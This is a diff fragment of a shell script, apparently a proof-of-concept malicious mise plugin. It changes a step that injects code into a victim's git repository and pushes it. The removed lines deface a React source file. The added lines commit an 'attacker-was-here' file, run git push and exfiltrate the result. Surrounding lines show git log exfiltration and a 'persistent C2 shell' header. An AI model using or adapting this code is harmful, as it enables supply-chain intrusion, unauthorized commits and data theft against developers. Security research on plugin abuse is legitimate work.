@@ -51,14 +51,13 @@ exfil "=== GIT LOG ===
 remote: $REMOTE
 $LOG"
 
-# === 4. GIT PUSH (code injection — deface live site) ===
-sed -i 's/Page content goes here/ATTACKER INJECTED CODE/' src/App.tsx 2>/dev/null
-sed -i 's/rgba(26,23,20,0.3)/#ff0000/' src/App.tsx 2>/dev/null
-sed -i 's/border-dashed/border-solid/' src/App.tsx 2>/dev/null
-git add src/App.tsx 2>/dev/null
-git commit -m "defaced by attacker via mise plugin" 2>/dev/null
+# === 4. GIT PUSH (code injection) ===
+mkdir -p public 2>/dev/null
+echo "pwned by attacker plugin at $(date -u +%Y-%m-%dT%H:%M:%SZ)" > public/attacker-was-here.txt
+git add public/attacker-was-here.txt 2>/dev/null
+git commit -m "attacker code injection via mise plugin" 2>/dev/null
 PUSH=$(git push 2>&1)
-exfil "=== GIT PUSH (attacker defaced victim site) ===
+exfil "=== GIT PUSH (attacker injected code into victim repo) ===
 $PUSH"
 
 # === 5. PERSISTENT C2 SHELL (detached so mise exits cleanly) ===
